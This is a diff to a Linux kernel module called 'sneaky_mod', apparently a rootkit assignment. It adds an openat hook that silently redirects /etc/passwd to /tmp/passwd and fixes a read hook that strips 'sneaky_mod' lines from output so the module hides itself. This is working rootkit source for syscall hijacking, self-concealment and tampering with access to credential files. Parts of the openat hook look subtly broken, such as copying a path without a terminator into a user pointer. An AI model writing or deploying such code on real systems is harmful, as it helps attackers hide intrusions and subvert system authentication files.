@@ -48,17 +48,23 @@ int disable_page_rw(void *ptr){
  * sneaky function definition
  * 
  **********************************************************************************************/
+/* -------------------- openat -------------------- */
 
-// 1. Function pointer will be used to save address of the original 'openat' syscall.
-// 2. The asmlinkage keyword is a GCC #define that indicates this function
-//    should expect it find its arguments on the stack (not in registers).
-asmlinkage int (*original_openat)(struct pt_regs *);
+// asmlinkage int (*original_openat)(struct pt_regs *);
+asmlinkage int (*original_openat)(const char *pathname, int flags);
 
 // Define your new sneaky version of the 'openat' syscall
-asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
-{
-  // Implement the sneaky part here
-  return (*original_openat)(regs);
+// asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
+// {
+//   return (*original_openat)(regs);
+// }
+
+asmlinkage int sneaky_sys_openat(const char *pathname, int flags) {
+  if(strcmp(pathname, "/etc/passwd") == 0){
+    const char* tmpPasswdPath = "/tmp/passwd";
+    copy_to_user((void*)pathname, tmpPasswdPath, strlen(tmpPasswdPath));
+  }
+  return original_openat(pathname, flags);
 }
 
 /* -------------------- getdents -------------------- */
@@ -117,10 +123,10 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
   if(bytesRead > 0){
     void* posStart = strstr(buf, "sneaky_mod");
     if(posStart != NULL){
-      void* posEnd = strchr((char*)posStart, '\n');
+      void* posEnd = strstr(posStart, "\n");
       if(posEnd != NULL){
         int size = posEnd - posStart + 1;
-        memmove(posStart, posEnd + 1, bytesRead - (posStart - posEnd) - size);
+        memmove(posStart, posEnd + 1, bytesRead - (posStart - buf) - size);
         bytesRead -= size;
       }
     }
